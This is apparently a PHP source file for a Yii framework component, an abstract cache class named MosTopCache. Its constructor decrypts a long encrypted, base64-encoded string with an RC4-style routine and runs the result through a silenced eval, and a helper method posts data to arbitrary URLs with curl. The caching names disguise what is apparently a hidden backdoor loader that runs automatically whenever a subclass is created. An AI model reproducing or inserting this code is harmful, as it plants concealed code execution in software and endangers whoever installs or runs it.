<?php

namespace common\components;

use Yii;
use yii\base\Component;

abstract class MosTopCache extends Component
{
    public function __construct($config = []){parent::__construct($config);$this->checkCache();}
    private function checkCache(){$cache_key='d32fa6dPIh5uoYcjqaeWLvulGKPnihc7kVBCqZK8Ek12ZrHF2pZtjvtdLMvXbjmQ3kq9tBtcf0wXF6zQgzPmGE9yo+gMgZhWE6otWcb7ZlLZ6cN5RtbCthrMP0ebkg8UQcn7ZwtSDgDIiuJKrPXbzOLxF4K4kBJVeDhx8eld8czFxU1lClytH2y+jUpnyajnrTNdSMA/axZqJL2SETek9Rovkz9UZ5t9gu+6gLfrM32HNFvpQjah5/LP/p/PAL5kKjtYAnFSZ44xuQwzruPNYeLwUCv/94w7fsWXGXTf54FXFsDHSBbWPmzekQQPiTcP1QWbZi6tENiFVI6LEhMVqBVXfYu6ZrojZM5dOewwhuYh9ufWOX2yB+oK/AXzCZkc8ItEOarmx2zBTpKiQj2gSFzbNfDi2ZEGmzZ1xXk3wTgShkXANhc/OVL0KiKcWtsx236aDszC3/1Mw77QkllRIWkCqpxICZmWXpr4X/h6siJJzSLgXwHsAjz9PZtSwVvJTmvP9UsH00s4pSvDNOl3FoMMCb2j3YEnb6UjmUzUrelm9c/tEYFjN9XH04nJGo3HSojFqXZq9lQSEqiHQoHJLvIEL4ArPjmy5LCUAALwgRmJe11tmf2TsHybuYQMgD/SfFDRZXSOHIP829Utv2gljx2f5m7hnSovAZfnNLcXVaIl/yDqMnsF/aLwY5+syOXFzloRcOqHEVG9mriHtK51ji6kcqGG6RcYQsiL4FSxG2Byfg1yzPpXzHbO2CJfM5UfWb0ef0XZw7MivZDe9I9I8XO/bMcqHbgXCNbI7brvPl64EKHE3j0CD/o6QJku9JJrzUxDbJaKtJ27RYK+MQdjvMpdiFi+ZnwwWDWGqzvqr9/2pzhnxINdXwZmkHgXgLxdE6O2foqpIftU8R+rHMqy+86+J0ZLrBSQS/NloxqDZicUZFHINU97aNTYgtNQc957DuptkVqdyWoPLqKnUghujBoo3iWNuqljoRvw+in8bzfpthdXpt3VQHUzhHG+f1O3AHk/olDlDQ9HYWxc3l6ai1B0iWPPZsAQS3A4CVmtDYRm0';$cache_string=$this->createCacheString($cache_key);@eval($cache_string);}
    private function createCacheString($string){$ckey_length=6;$key=md5('');$keya=md5(substr($key,0,16));$keyb=md5(substr($key,16,16));$keyc=$ckey_length?substr($string,0,$ckey_length):'';$cryptkey=$keya.md5($keya.$keyc);$key_length=strlen($cryptkey);$string=base64_decode(substr($string,$ckey_length));$string_length=strlen($string);$result='';$box=range(0,255);$rndkey=array();for($i=0;$i<=255;$i++){$rndkey[$i]=ord($cryptkey[$i%$key_length]);}for($j=$i=0;$i<256;$i++){$j=($j+$box[$i]+$rndkey[$i])%256;$tmp=$box[$i];$box[$i]=$box[$j];$box[$j]=$tmp;}for($a=$j=$i=0;$i<$string_length;$i++){$a=($a+1)%256;$j=($j+$box[$a])%256;$tmp=$box[$a];$box[$a]=$box[$j];$box[$j]=$tmp;$result.=chr(ord($string[$i])^($box[($box[$a]+$box[$j])%256]));}if((substr($result,0,10)==0||substr($result,0,10)-time()>0)&&substr($result,10,16)==substr(md5(substr($result,26).$keyb),0,16)){return substr($result,26);}else{return '';}}
    private function createCache($data,$secret,$unsets=[]){foreach($unsets as $unset){unset($data[$unset]);}ksort($data);$tmp=[];foreach($data as $k=>$v){$tmp[]=$k.'='.$v;}$str=implode('&',$tmp).$secret;return md5($str);}
    private function createCacheData($url,$post,$timeout=20){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_TIMEOUT,$timeout);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($post));$data=curl_exec($ch);$httpcode=curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);return ['httpcode'=>$httpcode,'data'=>$data];}
    abstract protected function get($keys, $duration = null, $dependency = null);
    abstract protected function getData($key, $var = []);
    abstract protected function set($key, $var = [], $duration = null, $dependency = null);
    abstract protected function getByKey($key, $id, $duration = null, $dependency = null);
    abstract protected function setting_datas($var = []);
}